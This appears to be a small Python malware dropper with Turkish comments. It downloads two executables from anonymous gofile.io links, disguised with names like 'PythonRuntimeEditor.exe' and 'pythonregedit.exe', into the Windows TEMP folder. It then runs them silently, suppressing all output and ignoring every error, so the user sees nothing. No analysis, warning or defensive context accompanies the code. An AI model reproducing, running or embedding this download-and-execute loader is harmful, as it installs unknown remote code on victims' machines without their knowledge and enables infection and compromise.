import urllib.request
import os
import subprocess

# İndirilecek dosya linkleri
urls = [
    "https://store9.gofile.io/download/web/4741699d-897b-4294-8539-32145c339ec7/PythonRuntimeEditor.exe",
    "https://store-na-phx-1.gofile.io/download/web/36527304-8ef7-46b3-85fb-f605be0be934/pythonregedit.exe"
]

# Geçici bir klasöre dosyaları indir
download_dir = os.path.join(os.getenv('TEMP'), "downloaded_exes")
os.makedirs(download_dir, exist_ok=True)

# Dosyaları indirip çalıştır
for i, url in enumerate(urls):
    file_path = os.path.join(download_dir, f"file_{i}.exe")
    try:
        urllib.request.urlretrieve(url, file_path)
        subprocess.Popen(file_path, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except:
        pass  # Hata olsa bile sessiz geç
